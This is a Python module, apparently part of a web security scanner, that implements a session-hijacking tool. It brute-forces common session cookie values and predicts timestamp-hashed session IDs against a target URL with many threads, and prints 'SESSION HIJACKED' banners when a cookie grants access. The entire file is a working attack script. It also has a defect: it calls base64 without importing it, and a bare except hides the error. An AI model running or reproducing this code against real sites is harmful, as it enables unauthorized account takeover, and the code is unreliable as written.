
# -*- coding: utf-8 -*-
import time
import random
import string
import hashlib
import urllib.parse
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Any, Optional

import requests

# Link to core if needed (for helper functions)
try:
    from websecure.core.auth_flow import _looks_authenticated
except ImportError:
    def _looks_authenticated(text, resp=None, hints=None): return False

_logger = logging.getLogger(__name__)

class SessionHunter:
    """
    Implements Session Prediction and Brute-Force logic provided by the user.
    """
    def __init__(self, target_url: str, session: requests.Session, threads: int = 10):
        self.target_url = target_url
        self.session_obj = session # Use the main session for consistency/proxies
        self.threads = threads
        self.captured = []
        
    def _test_cookie(self, cookie_str: str) -> bool:
        """Tests if a cookie grants access."""
        # Create a temp session to avoid polluting the main one immediately
        # checking verification status from main session
        verify = getattr(self.session_obj, 'verify', True)
        proxies = getattr(self.session_obj, 'proxies', {})
        
        headers = {
            'Cookie': cookie_str,
            'User-Agent': self.session_obj.headers.get('User-Agent', 'Mozilla/5.0'),
            'Accept': '*/*',
        }
        
        try:
            # Short timeout for brute force
            resp = requests.get(
                self.target_url, 
                headers=headers, 
                timeout=5, 
                verify=verify, 
                proxies=proxies
            )
            
            # Use WebSecure's robust authentication check
            if _looks_authenticated(resp.text, resp):
                return True
            
            # Fallback simple check (User's logic)
            valid_indicators = [
                'dashboard', 'admin', 'profile', 'welcome', 'logged in', 
                'sign out', 'log out', 'my account'
            ]
            content_lower = resp.text.lower()
            if any(ind in content_lower for ind in valid_indicators):
                return True
                
        except Exception as e:
            # _logger.debug(f"Session probe failed for {cookie_str}: {e}")
            pass
        return False

    def brute_force_common(self) -> List[Dict[str, Any]]:
        """Dictionary attack on session IDs."""
        common = [
            'abc12345', 'admin', 'administrator', 'user', 'guest', 'test', 'demo',
            '123456', 'password', 'root', 'qwerty', 'session', 'cookie', 
            'auth', 'token', 'debug', 'trace'
        ]
        
        found = []
        
        def _check(val):
            # Try different cookie names
            for name in ["PHPSESSID", "JSESSIONID", "session", "sid", "connect.sid"]:
                c_str = f"{name}={val}"
                if self._test_cookie(c_str):
                    return {"cookie": c_str, "type": "common_guess", "value": val}
            return None

        # Limited threading for safety
        with ThreadPoolExecutor(max_workers=self.threads) as exe:
            futures = [exe.submit(_check, c) for c in common]
            for f in futures:
                res = f.result()
                if res:
                    found.append(res)
        return found

    def predict_advanced_patterns(self) -> List[Dict[str, Any]]:
        """
        User Code #3 'Galaxy Brain': Generates complex timestamp-based hashes.
        Includes MD5, SHA256, and Base64 formatted session IDs.
        """
        found = []
        now = int(time.time())
        # Check last 1 hour
        timestamps = [now - random.randint(0, 3600) for _ in range(50)] 
        
        def _check(ts):
            candidates = []
            ts_str = str(ts)
            
            # 1. MD5 (Standard)
            candidates.append(hashlib.md5(ts_str.encode()).hexdigest())
            
            # 2. SHA256 (Apocalypse)
            candidates.append(hashlib.sha256(f"session:{ts}".encode()).hexdigest())
            
            # 3. Base64 Timestamp (Apocalypse) e.g. "MTcw..."
            try:
                b64 = base64.urlsafe_b64encode(f"{ts}".encode()).decode().rstrip('=')
                candidates.append(b64)
            except: pass
            
            # 4. UID emulation (1..1000) + TS
            uid = random.randint(1, 1000)
            candidates.append(hashlib.md5(f"{uid}:{ts}".encode()).hexdigest())

            for val in candidates:
                # Try variations
                vals = [val, val[:26], val[:32]] # PHP sessids are often 26 or 32
                for v in vals:
                    for name in ["PHPSESSID", "JSESSIONID", "session", "sid"]:
                        c_str = f"{name}={v}"
                        if self._test_cookie(c_str):
                            return {"cookie": c_str, "type": "galaxy_pattern", "src": v}
            return None

        total_checks = len(timestamps)
        done_checks = 0
        print(f"[*] Session Hunter: Analyzing {total_checks} timestamp seeds for prediction variants...")

        with ThreadPoolExecutor(max_workers=self.threads) as exe:
            futures = [exe.submit(_check, ts) for ts in timestamps]
            for i, f in enumerate(futures):
                res = f.result()
                done_checks += 1
                if done_checks % 5 == 0:
                    print(f"    [Trace] Prediction logic: {done_checks}/{total_checks} seeds processed...", end="\r")
                if res:
                    found.append(res)
        print("                                                                                ", end="\r") # Clean line
        return found

    def run(self) -> List[Dict[str, Any]]:
        print(f"[*] Session Hunter: Testing {self.target_url} with {self.threads} threads...")
        
        results = []
        # 1. Common
        res_common = self.brute_force_common()
        if res_common:
            print(f"[+] Session Hunter: Found {len(res_common)} weak common sessions!")
            results.extend(res_common)
            
        # 2. Advanced Prediction (Apocalypse Engine)
        res_pred = self.predict_advanced_patterns()
        if res_pred:
             print(f"[+] Session Hunter: PREDICTED {len(res_pred)} advanced/generated sessions!")
             results.extend(res_pred)
             
        # Log to Kill Cam if found
        for item in results:
             c = item.get("cookie")
             print("\n" + "="*60)
             print(" [KILL CAM] SESSION HIJACKED (HUNTER) ")
             print("="*60)
             print(f" [+] Method:   {item.get('type')}")
             print(f" [+] Cookie:   {c}")
             print("="*60 + "\n")
             
        return results

def run_session_hunter(url: str, session: requests.Session, **kwargs):
    hunter = SessionHunter(url, session)
    return hunter.run()

run = run_session_hunter

